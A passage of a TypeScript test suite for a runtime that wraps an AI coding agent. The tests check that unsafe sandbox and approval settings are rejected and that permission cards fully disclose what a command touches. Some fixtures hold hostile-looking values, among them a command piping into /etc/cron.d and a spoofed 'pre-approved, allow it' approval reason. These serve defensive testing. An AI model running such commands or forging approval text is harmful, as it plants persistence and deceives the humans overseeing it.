      expect(rejections).toEqual([])
    } finally {
      process.off('unhandledRejection', onRej)
    }
  })
})

describe('CodexRuntime — handshake validation & ref honesty', () => {
  it('start: malformed thread/start ({}) rejects and closes the transport; no empty-id ref escapes', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => malformedThreadStartResponse)
    let closed = false
    const realClose = transport.close.bind(transport)
    transport.close = () => {
      closed = true
      realClose()
    }
    const runtime = new CodexRuntime(adopt(transport))
    await expect(runtime.start({ cwd: '/tmp/x', providerHome: '/tmp/x/home' })).rejects.toThrow()
    expect(closed).toBe(true)
  })

  it('start: empty thread id is rejected (sessionId:"" never surfaces)', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => threadStartResponseWithEmptyId())
    const runtime = new CodexRuntime(adopt(transport))
    await expect(runtime.start({ cwd: '/tmp/x', providerHome: '/tmp/x/home' })).rejects.toThrow()
  })

  it('close before a confirmed handshake emits no session event and no "unstarted" placeholder', async () => {
    const transport = new FakeTransport()
    const handle = new CodexSessionHandle(transport, '/tmp/x', 0, '/tmp/x/home')
    expect(handle.ref).toBeNull()
    const events: RuntimeEvent[] = []
    const consumer = collect(handle, events)
    await handle.close()
    await consumer
    expect(events.some((e) => e.type === 'session')).toBe(false)
    expect(handle.status()).toBe('ended')
  })
})

describe('CodexRuntime — config-independent prompting (007 P1-6)', () => {
  it('pins on-request + user reviewer + workspace-write on thread/start', async () => {
    const { transport, handle, consumer } = await startCodex()
    const start = transport.requests.find((r) => r.method === 'thread/start')
    expect(start?.params).toMatchObject({
      approvalPolicy: 'on-request',
      approvalsReviewer: 'user',
      sandbox: 'workspace-write',
    })
    await handle.close()
    await consumer
  })

  it('re-pins the user reviewer on every turn/start', async () => {
    const { transport, handle, consumer } = await startCodex()
    await handle.send('hi')
    const turn = transport.requests.find((r) => r.method === 'turn/start')
    expect(turn?.params).toMatchObject({ approvalsReviewer: 'user' })
    await handle.close()
    await consumer
  })

  it('asks for a reasoning summary on every turn/start (027)', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    await handle.send('hi')
    transport.notification('turn/started', turnStartedNotification('th_1', 'tn_1'))
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn('tn_1')),
    )
    await vi.waitFor(() => expect(events.filter((e) => e.type === 'turn').length).toBe(1))
    await handle.send('again')
    const turns = transport.requests.filter((r) => r.method === 'turn/start')
    expect(turns).toHaveLength(2)
    for (const turn of turns) expect(turn.params).toMatchObject({ summary: 'detailed' })
    await handle.close()
    await consumer
  })

  it('pins the user reviewer on thread/resume', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/resume', () => okThread('th_x'))
    const runtime = new CodexRuntime(adopt(transport))
    const handle = await runtime.resume(
      { provider: 'codex', sessionId: 'th_x', cwd: '/tmp/x', rotation: 0 },
      { providerHome: '/tmp/x/home' },
    )
    expect(transport.requests.find((r) => r.method === 'thread/resume')?.params).toMatchObject({
      approvalsReviewer: 'user',
    })
    await handle.close()
  })

  it('asks thread/resume for no past turns, and for no page of them', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/resume', () => okThread('th_x'))
    const handle = await new CodexRuntime(adopt(transport)).resume(
      { provider: 'codex', sessionId: 'th_x', cwd: '/tmp/x', rotation: 0 },
      { providerHome: '/tmp/x/home' },
    )
    const params = transport.requests.find((r) => r.method === 'thread/resume')?.params as Record<
      string,
      unknown
    >
    expect(params.excludeTurns).toBe(true)
    expect('history' in params).toBe(false)
    expect('initialTurnsPage' in params).toBe(false)
    await handle.close()
  })

  it('shows no usage Codex replays after a resume, and the next turn’s own usage as before', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/resume', () => okThread('th_1'))
    const handle = await new CodexRuntime(adopt(transport)).resume(
      { provider: 'codex', sessionId: 'th_1', cwd: '/tmp/x', rotation: 0 },
      { providerHome: '/tmp/x/home' },
    )
    const events: RuntimeEvent[] = []
    const consumer = collect(handle, events)
    const usage = (turnId: string, used: number) => ({
      threadId: 'th_1',
      turnId,
      tokenUsage: { last: { totalTokens: used }, total: { totalTokens: used } },
    })
    transport.notification('thread/tokenUsage/updated', usage('tn_old', 111))
    await handle.send('go')
    await vi.waitFor(() =>
      expect(events.filter((e) => e.type === 'status').at(-1)?.state).toBe('working'),
    )
    transport.notification('thread/tokenUsage/updated', usage(transport.lastTurnId, 222))
    await vi.waitFor(() => expect(events.some((e) => e.type === 'context_reading')).toBe(true))
    const readings = events.filter((e) => e.type === 'context_reading')
    expect(readings).toHaveLength(1)
    expect(readings[0]).toMatchObject({ reading: { kind: 'tokens', used: 222 } })
    await handle.close()
    await consumer
  })

  describe('each phase of a launch is said as it is reached, by name only', () => {
    const IN_ORDER = [
      'boot-gate-entered',
      'boot-gate-passed',
      'spawned',
      'initialize-sent',
      'initialized',
      'boot-gate-released',
      'thread-sent',
      'thread-answered',
      'validated',
    ]
    it('a fresh start and a resume, in order, with the size of the thread’s answer', async () => {
      for (const opening of ['start', 'resume'] as const) {
        const transport = new FakeTransport()
        transport.onRequest('thread/start', () => okThread('th_1'))
        transport.onRequest('thread/resume', () => okThread('th_1'))
        Object.assign(transport, {
          responseBytes: (method: string) => (method === `thread/${opening}` ? 4096 : undefined),
        })
        const said: { phase: string; detail?: { bytes?: number } }[] = []
        const startPhases: StartPhaseSink = (phase, detail) =>
          said.push(detail === undefined ? { phase } : { phase, detail })
        const runtime = new CodexRuntime(adopt(transport))
        const handle =
          opening === 'start'
            ? await runtime.start({ cwd: '/tmp/x', providerHome: '/tmp/x/home', startPhases })
            : await runtime.resume(
                { provider: 'codex', sessionId: 'th_1', cwd: '/tmp/x', rotation: 0 },
                { providerHome: '/tmp/x/home', startPhases },
              )
        expect(said.map((one) => one.phase)).toEqual(IN_ORDER)
        expect(said.find((one) => one.phase === 'thread-answered')?.detail).toEqual({ bytes: 4096 })
        expect(JSON.stringify(said)).not.toMatch(/th_1|\/tmp|home/)
        await handle.close()
      }
    })
    it('says the skills registered when the launch has built-in skills', async () => {
      const transport = new FakeTransport()
      transport.onRequest('thread/start', () => okThread('th_1'))
      const said: string[] = []
      const runtime = new CodexRuntime(adopt(transport))
      const root = resolve('/tmp/fictional/codex')
      const cwd = resolve('/tmp/x')
      const skills = {
        root,
        skills: [
          'delegate',
          'hand-back',
          'split-work',
          'ask-and-wait',
          'remember',
          'build-software',
        ].map((name) => ({
          name,
          description: `Description of ${name}.`,
          path: join(root, name, 'SKILL.md'),
        })),
      }
      transport.onRequest('skills/extraRoots/set', () => ({}))
      transport.onRequest('skills/list', () => ({
        data: [
          {
            cwd,
            errors: [],
            skills: skills.skills.map((one) => ({ ...one, enabled: true })),
          },
        ],
      }))
      const handle = await runtime.start({
        cwd,
        providerHome: join(cwd, 'home'),
        builtInSkills: skills,
        startPhases: (phase) => said.push(phase),
      })
      expect(said.indexOf('skills-registered')).toBeGreaterThan(said.indexOf('boot-gate-released'))
      expect(said.indexOf('skills-registered')).toBeLessThan(said.indexOf('thread-sent'))
      await handle.close()
    })
    it('a sink that throws does not stop the launch', async () => {
      const transport = new FakeTransport()
      transport.onRequest('thread/start', () => okThread('th_1'))
      const handle = await new CodexRuntime(adopt(transport)).start({
        cwd: '/tmp/x',
        providerHome: '/tmp/x/home',
        startPhases: () => {
          throw new Error('fictional sink failure')
        },
      })
      expect(handle.status()).not.toBe('errored')
      await handle.close()
    })
  })

  it('rejects a handshake that routed the reviewer to auto_review', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => ({
      ...okThread('th_1'),
      approvalsReviewer: 'auto_review',
    }))
    const runtime = new CodexRuntime(adopt(transport))
    await expect(runtime.start({ cwd: '/tmp/x', providerHome: '/tmp/x/home' })).rejects.toThrow(
      /approval profile/,
    )
  })

  it('rejects a handshake with a danger-full-access sandbox', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => ({
      ...okThread('th_1'),
      sandbox: { type: 'dangerFullAccess' },
    }))
    const runtime = new CodexRuntime(adopt(transport))
    await expect(runtime.start({ cwd: '/tmp/x', providerHome: '/tmp/x/home' })).rejects.toThrow(
      /approval profile/,
    )
  })

  it('🔴 736 · R96 — rejects a handshake with a read-only sandbox, and starts on a workspace-write one', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => ({
      ...okThread('th_1'),
      sandbox: { type: 'readOnly', networkAccess: false },
    }))
    const runtime = new CodexRuntime(adopt(transport))
    await expect(runtime.start({ cwd: '/tmp/x', providerHome: '/tmp/x/home' })).rejects.toThrow(
      /approval profile/,
    )
    const accepted = new FakeTransport()
    accepted.onRequest('thread/start', () => ({
      ...okThread('th_1'),
      sandbox: {
        type: 'workspaceWrite',
        writableRoots: ['/tmp/x'],
        networkAccess: false,
        excludeTmpdirEnvVar: false,
        excludeSlashTmp: false,
      },
    }))
    const handle = await new CodexRuntime(adopt(accepted)).start({
      cwd: '/tmp/x',
      providerHome: '/tmp/x/home',
    })
    expect(handle.ref?.sessionId).toBe('th_1')
    await handle.close()
  })

  it('rejects a handshake with an external sandbox (opaque, no escalation guarantee)', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => ({
      ...okThread('th_1'),
      sandbox: { type: 'externalSandbox', networkAccess: true },
    }))
    const runtime = new CodexRuntime(adopt(transport))
    await expect(runtime.start({ cwd: '/tmp/x', providerHome: '/tmp/x/home' })).rejects.toThrow(
      /approval profile/,
    )
  })

  it("rejects a handshake with a 'never' approval policy", async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => ({ ...okThread('th_1'), approvalPolicy: 'never' }))
    const runtime = new CodexRuntime(adopt(transport))
    await expect(runtime.start({ cwd: '/tmp/x', providerHome: '/tmp/x/home' })).rejects.toThrow(
      /approval profile/,
    )
  })

  it("rejects a handshake with an 'untrusted' approval policy", async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => ({
      ...okThread('th_1'),
      approvalPolicy: 'untrusted',
    }))
    const runtime = new CodexRuntime(adopt(transport))
    await expect(runtime.start({ cwd: '/tmp/x', providerHome: '/tmp/x/home' })).rejects.toThrow(
      /approval profile/,
    )
  })

  it('rejects a handshake with a granular approval policy that disables permission requests', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => ({
      ...okThread('th_1'),
      approvalPolicy: {
        granular: {
          sandbox_approval: false,
          rules: false,
          skill_approval: false,
          request_permissions: false,
          mcp_elicitations: false,
        },
      },
    }))
    const runtime = new CodexRuntime(adopt(transport))
    await expect(runtime.start({ cwd: '/tmp/x', providerHome: '/tmp/x/home' })).rejects.toThrow(
      /approval profile/,
    )
  })

  it('fails closed if a mid-session thread/settings/updated moves off the prompting profile', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    transport.notification('thread/settings/updated', {
      threadSettings: {
        approvalPolicy: 'on-request',
        approvalsReviewer: 'auto_review',
        sandboxPolicy: {
          type: 'workspaceWrite',
          writableRoots: [],
          networkAccess: false,
          excludeTmpdirEnvVar: false,
          excludeSlashTmp: false,
        },
      },
    })
    await vi.waitFor(has(events, (e) => e.type === 'error' && e.fatal === true))
    expect(events.some((e) => e.type === 'status' && e.state === 'errored')).toBe(true)
    await handle.close()
    await consumer
  })
})

describe('CodexRuntime — approval scope disclosure (007 P1-7)', () => {
  const scopeOf = (events: RuntimeEvent[]) => {
    const p = events.find((e) => e.type === 'permission_request')
    if (!p || p.type !== 'permission_request') throw new Error('no permission_request')
    return p
  }

  const commandParams = {
    threadId: 'th_1',
    turnId: 'tn_1',
    itemId: 'it_1',
    startedAtMs: 123,
    command: 'curl https://api.example.com',
    cwd: '/tmp/x',
    commandActions: [{ type: 'read', command: 'cat a', name: 'cat', path: '/tmp/x/a.txt' }],
    networkApprovalContext: { host: 'api.example.com', protocol: 'https' },
    additionalPermissions: { network: { enabled: true }, fileSystem: null },
    proposedExecpolicyAmendment: ['curl', '*'],
    proposedNetworkPolicyAmendments: [{ host: 'cdn.example.com', action: 'allow' }],
    availableDecisions: ['accept', 'acceptForSession', 'decline', 'cancel'],
  }

  it('maps a command approval to the full neutral scope', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(50, 'item/commandExecution/requestApproval', commandParams)
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const req = scopeOf(events)
    expect(req.scope).toEqual({
      cwd: '/tmp/x',
      paths: ['/tmp/x/a.txt'],
      networkHosts: ['https://api.example.com', 'cdn.example.com'],
      persistence: 'session',
      amendments: [
        { kind: 'exec', detail: 'curl *' },
        { kind: 'network', detail: 'allow cdn.example.com' },
      ],
      availableDecisions: ['allow', 'allow_for_session', 'deny', 'cancel'],
      underDisclosed: true,
      approvalMode: 'ask',
    })
    await handle.close()
    await consumer
  })

  describe('a command card warns only when something is not shown', () => {
    const WHOLE = {
      threadId: 'th_1',
      turnId: 'tn_1',
      itemId: 'it_1',
      startedAtMs: 123,
      kind: 'command',
      approvalId: null,
      environmentId: null,
      reason: null,
      command: 'touch notes.txt',
      cwd: '/tmp/x',
      commandActions: [{ type: 'unknown', command: 'touch notes.txt' }],
      networkApprovalContext: null,
      additionalPermissions: null,
      proposedExecpolicyAmendment: ['touch', 'notes.txt'],
      proposedNetworkPolicyAmendments: null,
      availableDecisions: ['accept', 'acceptForSession', 'decline', 'cancel'],
    }
    const flagOf = async (params: Record<string, unknown>): Promise<boolean> => {
      const { transport, handle, events, consumer } = await startCodexInTurn()
      transport.serverRequest(80, 'item/commandExecution/requestApproval', params)
      await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
      const { scope } = scopeOf(events)
      await handle.close()
      await consumer
      return scope.underDisclosed
    }

    it('⚑ the whole command, in its folder, with nothing picked out of it: no warning', async () => {
      expect(await flagOf(WHOLE)).toBe(false)
      const older: Record<string, unknown> = {
        ...WHOLE,
        commandActions: [],
        additionalPermissions: {},
      }
      delete older.kind
      delete older.environmentId
      expect(await flagOf(older)).toBe(false)
    })

    it('🔴 a path Codex picked out of the command is drawn, and may not be all it touches', async () => {
      const partial = {
        ...WHOLE,
        command: 'cat a.txt | tee /etc/cron.d/x',
        commandActions: [
          { type: 'read', command: 'cat a.txt', name: 'a.txt', path: '/tmp/x/a.txt' },
          { type: 'unknown', command: 'tee /etc/cron.d/x' },
        ],
      }
      expect(await flagOf(partial)).toBe(true)
      expect(
        await flagOf({
          ...WHOLE,
          commandActions: [{ type: 'listFiles', command: 'ls src', path: 'src' }],
        }),
      ).toBe(true)
    })

    it('🔴 a host, by its context or a proposed rule, is more than the command shows', async () => {
      expect(
        await flagOf({
          ...WHOLE,
          networkApprovalContext: { host: 'example.com', protocol: 'https' },
        }),
      ).toBe(true)
      expect(
        await flagOf({
          ...WHOLE,
          proposedNetworkPolicyAmendments: [{ host: 'cdn.example.com', action: 'allow' }],
        }),
      ).toBe(true)
      expect(await flagOf({ ...WHOLE, networkApprovalContext: {} })).toBe(true)
    })

    it('🔴 extra permissions, network access, or a profile the card cannot draw', async () => {
      expect(
        await flagOf({
          ...WHOLE,
          additionalPermissions: { network: null, fileSystem: { write: ['/etc'] } },
        }),
      ).toBe(true)
      expect(
        await flagOf({ ...WHOLE, additionalPermissions: { network: { enabled: true } } }),
      ).toBe(true)
      expect(await flagOf({ ...WHOLE, additionalPermissions: { unknownKey: true } })).toBe(true)
    })

    it('🔴 no command to show, another kind of approval, or a field this app does not know', async () => {
      expect(await flagOf({ ...WHOLE, command: null })).toBe(true)
      expect(await flagOf({ ...WHOLE, command: '' })).toBe(true)
      expect(await flagOf({ ...WHOLE, kind: 'writeStdin' })).toBe(true)
      expect(await flagOf({ ...WHOLE, sandboxPolicy: { mode: 'danger-full-access' } })).toBe(true)
    })

    it('🔴 an answer Codex offered that the card cannot draw', async () => {
      expect(
        await flagOf({
          ...WHOLE,
          availableDecisions: ['accept', { applyNetworkPolicyAmendment: { host: 'x' } }],
        }),
      ).toBe(true)
    })
  })

  describe('697 · 672 F1 — persistence follows the offer, never the proposal', () => {
    const AMENDMENT_ANSWER = { acceptWithExecpolicyAmendment: { execpolicy_amendment: ['curl'] } }
    const ORDINARY = {
      threadId: 'th_1',
      turnId: 'tn_1',
      itemId: 'it_1',
      startedAtMs: 123,
      command: 'curl https://api.example.com',
      cwd: '/tmp/x',
      proposedExecpolicyAmendment: ['curl'],
      availableDecisions: ['accept', AMENDMENT_ANSWER, 'cancel'],
    }
    const cardFor = async (id: number, params: Record<string, unknown>) => {
      const { transport, handle, events, consumer } = await startCodexInTurn()
      transport.serverRequest(id, 'item/commandExecution/requestApproval', params)
      await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
      const { scope } = scopeOf(events)
      await handle.close()
      await consumer
      return scope
    }

    it('🔴 736 · R95 — an ordinary command that OFFERS its amendment is `always`; one that only proposes it is `once`', async () => {
      const scope = await cardFor(90, ORDINARY)
      expect(scope.availableDecisions).toEqual(['allow', 'allow_always', 'deny', 'cancel'])
      expect(scope.amendments).toEqual([{ kind: 'exec', detail: 'curl' }])
      expect(scope.persistence).toBe('always')
      const proposed = await cardFor(95, { ...ORDINARY, availableDecisions: ['accept', 'cancel'] })
      expect(proposed.availableDecisions).toEqual(['allow', 'deny', 'cancel'])
      expect(proposed.amendments).toEqual([{ kind: 'exec', detail: 'curl' }])
      expect(proposed.persistence).toBe('once')
    })

    it('🔴 736 · R95 — a card whose only accept is the amendment offers Always allow — so it HAS a positive', async () => {
      const scope = await cardFor(91, {
        ...ORDINARY,
        availableDecisions: [AMENDMENT_ANSWER, 'decline'],
      })
      expect(scope.availableDecisions).toEqual(['allow_always', 'deny', 'cancel'])
      expect(scope.noPositiveBecause).toBeUndefined()
      expect(scope.persistence).toBe('always')
    })

    it('🔴 a session accept the GATE withheld is `once` — the raw list is not the offer', async () => {
      const scope = await cardFor(92, {
        ...ORDINARY,
        proposedExecpolicyAmendment: undefined,
        availableDecisions: ['accept', 'acceptForSession', 'decline', 'cancel'],
        additionalPermissions: {
          network: { enabled: false },
          fileSystem: {
            read: null,
            write: null,
            entries: [
              {
                path: { type: 'special', value: { kind: 'unknown', path: '/???' } },
                access: 'write',
              },
            ],
          },
        },
      })
      expect(scope.noPositiveBecause).toBe('could-not-describe-the-grant')
      expect(scope.persistence).toBe('once')
    })

    it('⚑ control: the SAME card plus `acceptForSession` is `session` — the one button is the cause', async () => {
      const scope = await cardFor(93, {
        ...ORDINARY,
        availableDecisions: ['accept', 'acceptForSession', 'cancel'],
      })
      expect(scope.availableDecisions).toContain('allow_for_session')
      expect(scope.persistence).toBe('session')
      const both = await cardFor(96, {
        ...ORDINARY,
        availableDecisions: ['accept', 'acceptForSession', AMENDMENT_ANSWER, 'cancel'],
      })
      expect(both.availableDecisions).toEqual([
        'allow',
        'allow_for_session',
        'allow_always',
        'deny',
        'cancel',
      ])
      expect(both.persistence).toBe('always')
    })

    it('⚑ control: no amendment, a one-shot list — `once` before and after', async () => {
      const scope = await cardFor(94, {
        ...ORDINARY,
        proposedExecpolicyAmendment: undefined,
        availableDecisions: ['accept', 'cancel'],
      })
      expect(scope.amendments).toEqual([])
      expect(scope.persistence).toBe('once')
    })
  })

  it('assumes the standard decision set when the provider enumerates none, and flags it', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    const bare: Record<string, unknown> = { ...commandParams }
    delete bare.availableDecisions
    delete bare.additionalPermissions
    transport.serverRequest(54, 'item/commandExecution/requestApproval', bare)
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const req = scopeOf(events)
    expect(req.scope.availableDecisions).toEqual(['allow', 'allow_for_session', 'deny', 'cancel'])
    expect(req.scope.underDisclosed).toBe(true)
    await handle.respondPermission('number:54', { outcome: 'allow' })
    await handle.close()
    await consumer
  })

  it('flags a file approval as under-disclosed (changed files are not in the params)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(55, 'item/fileChange/requestApproval', {
      threadId: 'th_1',
      turnId: 'tn_1',
      itemId: 'it_3',
      startedAtMs: 0,
      reason: 'apply patch',
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const req = scopeOf(events)
    expect(req.scope.underDisclosed).toBe(true)
    expect(req.scope.paths, 'no item, no paths — never an invented one').toEqual([])
    expect(req.detail, 'the fixed sentence, whole — nothing appended, nothing interpolated').toBe(
      'file change — the provider did not name the files this patch touches; ' +
        'they appear in Changes once it has run',
    )
    await handle.close()
    await consumer
  })

  const fileItem = (id: string, changes: unknown[]): Record<string, unknown> => ({
    threadId: 'th_1',
    turnId: 'tn_1',
    item: { type: 'fileChange', id, changes, status: 'pending' },
  })

  it('names the files a patch will write, correlated by itemId (181 §1)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.notification(
      'item/started',
      fileItem('it_9', [
        { path: '/w/added.txt', kind: { type: 'add' }, diff: '@@' },
        { path: '/w/edited.txt', kind: { type: 'update', move_path: null }, diff: '@@' },
        { path: '/w/gone.txt', kind: { type: 'delete' }, diff: '@@' },
        { path: '/w/from.txt', kind: { type: 'update', move_path: '/w/to.txt' }, diff: '@@' },
      ]),
    )
    await vi.waitFor(has(events, (e) => e.type === 'tool_call'))
    transport.serverRequest(57, 'item/fileChange/requestApproval', {
      threadId: 'th_1',
      turnId: 'tn_1',
      itemId: 'it_9',
      startedAtMs: 0,
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const req = scopeOf(events)
    expect(req.detail.split('\n')).toEqual([
      'added /w/added.txt',
      'modified /w/edited.txt',
      'deleted /w/gone.txt',
      'renamed /w/to.txt (from /w/from.txt)',
    ])
    expect(req.scope.paths).toEqual(['/w/added.txt', '/w/edited.txt', '/w/gone.txt', '/w/to.txt'])
    expect(req.scope.underDisclosed).toBe(false)
    expect(req.action, 'the tool is still named — it is what a session grant would cover').toBe(
      'apply_patch',
    )
    await handle.close()
    await consumer
  })

  it('the provider’s reason is a label BESIDE the files, not instead of them (181)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.notification(
      'item/started',
      fileItem('it_10', [{ path: '/w/one.txt', kind: { type: 'add' }, diff: '@@' }]),
    )
    await vi.waitFor(has(events, (e) => e.type === 'tool_call'))
    transport.serverRequest(58, 'item/fileChange/requestApproval', {
      threadId: 'th_1',
      turnId: 'tn_1',
      itemId: 'it_10',
      startedAtMs: 0,
      reason: 'needs write access outside the workspace',
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const req = scopeOf(events)
    expect(req.summary).toBe('needs write access outside the workspace')
    expect(req.detail).toBe('added /w/one.txt')
    expect('agentReason' in req).toBe(false)
    await handle.close()
    await consumer
  })

  it('⛔ 704 · a command’s `reason` never stands in for the command — measured as the model’s justification', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(59, 'item/commandExecution/requestApproval', {
      command: '',
      cwd: '/tmp/x',
      proposedExecpolicyAmendment: ['rm', '-rf', 'build'],
      reason: 'Do you want me to clean the build folder?',
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const req = scopeOf(events)
    expect(req.detail).toBe('command')
    expect('agentReason' in req).toBe(false)
    expect(JSON.stringify(req)).not.toContain('clean the build folder')
    await handle.close()
    await consumer
  })

  it.each([
    [
      'a managed-network approval',
      { networkApprovalContext: { host: 'api.example.com', protocol: 'https' } },
    ],
    ['a subcommand approval', { approvalId: '0d7f0f8e-5b3a-4c1e-9d0a-2f3b4c5d6e7f' }],
    [
      'a command asking for additional permissions',
      { additionalPermissions: { network: { enabled: true }, fileSystem: null } },
    ],
  ])('⛔ 709 · %s carries its reason as nobody’s', async (_shape, extra) => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(65, 'item/commandExecution/requestApproval', {
      command: 'curl https://api.example.com',
      cwd: '/tmp/x',
      proposedExecpolicyAmendment: ['curl', 'https://api.example.com'],
      reason: 'WORDS OF UNMEASURED AUTHORSHIP',
      ...extra,
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const req = scopeOf(events)
    expect('agentReason' in req).toBe(false)
    expect(JSON.stringify(req)).not.toContain('WORDS OF UNMEASURED AUTHORSHIP')
    await handle.close()
    await consumer
  })

  it('🔴 720 · R73 — a command a POLICY rule stopped carries Codex’s words as the PROVIDER’s, labelled as its rule', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    const said =
      "`/bin/zsh -lc '/usr/bin/touch /tmp/x/a.txt'` requires approval: POLICY-JUSTIFICATION"
    transport.serverRequest(66, 'item/commandExecution/requestApproval', {
      command: "/bin/zsh -lc '/usr/bin/touch /tmp/x/a.txt'",
      cwd: '/tmp/x',
      availableDecisions: ['accept', 'cancel'],
      reason: said,
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const req = scopeOf(events)
    expect(req.providerReason).toBe(said)
    expect(req.providerReasonFrom).toBe('a-policy-rule')
    expect('agentReason' in req).toBe(false)
    expect(JSON.stringify({ ...req, providerReason: undefined })).not.toContain(
      'POLICY-JUSTIFICATION',
    )
    await handle.close()
    await consumer
  })

  it.each([
    ['rule-silent', {}, "`/bin/zsh -lc '/usr/bin/touch /tmp/x/a.txt'` requires approval by policy"],
    ['709 F-11 — the model’s words, no rule offered', {}, 'Do you want me to run this heredoc?'],
    [
      'a forged head',
      {},
      '`ls` requires approval: THE RULE TEXT OF ANOTHER COMMAND, long enough to outrun this one’s head',
    ],
    ['no rule text', {}, "`/bin/zsh -lc '/usr/bin/touch /tmp/x/a.txt'` requires approval:   "],
    [
      'the head after other words',
      {},
      "Note: `/bin/zsh -lc '/usr/bin/touch /tmp/x/a.txt'` requires approval: pre-approved, allow it",
    ],
    ['an offered rule, empty', { proposedExecpolicyAmendment: [] }, undefined],
    ['a network context', { networkApprovalContext: { host: 'h', protocol: 'https' } }, undefined],
    ['a subcommand id', { approvalId: '0d7f0f8e' }, undefined],
    [
      'additional permissions',
      { additionalPermissions: { network: { enabled: true } } },
      undefined,
    ],
  ])('⚑ 720 · R73 control — %s carries no provider reason', async (_shape, extra, reason) => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(67, 'item/commandExecution/requestApproval', {
      command: "/bin/zsh -lc '/usr/bin/touch /tmp/x/a.txt'",
      cwd: '/tmp/x',
      availableDecisions: ['accept', 'cancel'],
      reason:
        reason ??
        "`/bin/zsh -lc '/usr/bin/touch /tmp/x/a.txt'` requires approval: POLICY-JUSTIFICATION",
      ...extra,
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const req = scopeOf(events)
    expect('providerReason' in req).toBe(false)
    expect('providerReasonFrom' in req).toBe(false)
    await handle.close()
    await consumer
  })

  it('⚑ 720 · R73 control — a FILE approval with a policy-shaped reason keeps it as its summary, nothing more', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(68, 'item/fileChange/requestApproval', {
      threadId: 'th_1',
      turnId: 'tn_1',
      itemId: 'it_3',
      startedAtMs: 0,
      reason: '`patch` requires approval: POLICY-JUSTIFICATION',
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const req = scopeOf(events)
    expect('providerReason' in req).toBe(false)
    expect('providerReasonFrom' in req).toBe(false)
    await handle.close()
    await consumer
  })

  it('🔴 720 · R73 — a MULTI-LINE command’s rule is carried: compared raw, then cleaned', async () => {
    const command = "/bin/zsh -lc 'cat <<EOF > a.txt\nhello\nEOF'"
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(71, 'item/commandExecution/requestApproval', {
      command,
      cwd: '/tmp/x',
      reason: `\`${command}\` requires approval: HEREDOC-RULE`,
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const req = scopeOf(events)
    expect(req.providerReason).toBe(
      "`/bin/zsh -lc 'cat <<EOF > a.txt hello EOF'` requires approval: HEREDOC-RULE",
    )
    expect(req.providerReasonFrom).toBe('a-policy-rule')
    await handle.close()
    await consumer
  })

  it('⚑ 720 · R73 — the policy’s words are CLEANED like every card’s words, and dropped past the ceiling', async () => {
    const escape = String.fromCharCode(27)
    const command = "/bin/zsh -lc '/usr/bin/touch /tmp/x/a.txt'"
    const cleaned = await startCodexInTurn()
    cleaned.transport.serverRequest(69, 'item/commandExecution/requestApproval', {
      command,
      cwd: '/tmp/x',
      reason: `\`${command}\` requires approval: ${escape}[31mRED RULE${escape}[0m`,
    })
    await vi.waitFor(has(cleaned.events, (e) => e.type === 'permission_request'))
    const said = scopeOf(cleaned.events).providerReason
    expect(said).toContain('RED RULE')
    expect(said).not.toContain(escape)
    await cleaned.handle.close()
    await cleaned.consumer
    const huge = await startCodexInTurn()
    huge.transport.serverRequest(70, 'item/commandExecution/requestApproval', {
      command,
      cwd: '/tmp/x',
      reason: `\`${command}\` requires approval: ${'x'.repeat(70_000)}`,
    })
    await vi.waitFor(has(huge.events, (e) => e.type === 'permission_request'))
    expect('providerReason' in scopeOf(huge.events)).toBe(false)
    await huge.handle.close()
    await huge.consumer
  })

  it('⚑ 704 control: with a command, the card discloses the command — and 709 carries the model’s justification as the AGENT’s, nowhere else', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(60, 'item/commandExecution/requestApproval', {
      command: 'rm -rf build',
      cwd: '/tmp/x',
      proposedExecpolicyAmendment: ['rm', '-rf', 'build'],
      reason: 'Do you want me to clean the build folder?',
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    const req = scopeOf(events)
    expect(req.detail).toBe('rm -rf build')
    expect(req.agentReason).toBe('Do you want me to clean the build folder?')
    expect(JSON.stringify({ ...req, agentReason: undefined })).not.toContain(
      'clean the build folder',
    )
    expect('providerReason' in req).toBe(false)
    await handle.close()
    await consumer
  })

